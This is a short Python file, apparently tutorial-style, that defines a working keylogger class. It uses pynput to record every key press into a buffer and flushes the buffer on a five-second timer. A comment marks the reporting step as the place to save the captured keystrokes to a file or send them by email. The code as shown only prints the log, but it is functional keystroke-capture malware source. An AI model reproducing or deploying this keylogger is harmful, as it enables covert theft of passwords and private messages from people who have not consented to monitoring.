#! /usr/bin/env python

import pynput.keyboard as pynkey
import threading


class Keylogger:
    def __init__(self):
        print('constr method')
        self.log = ""

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)  # Place for reporting the log. Either saving to file or sending by email.
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynkey.Listener(on_press=self.process_key_press)
        # Can also run it without 'with' block, using .join() method.
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
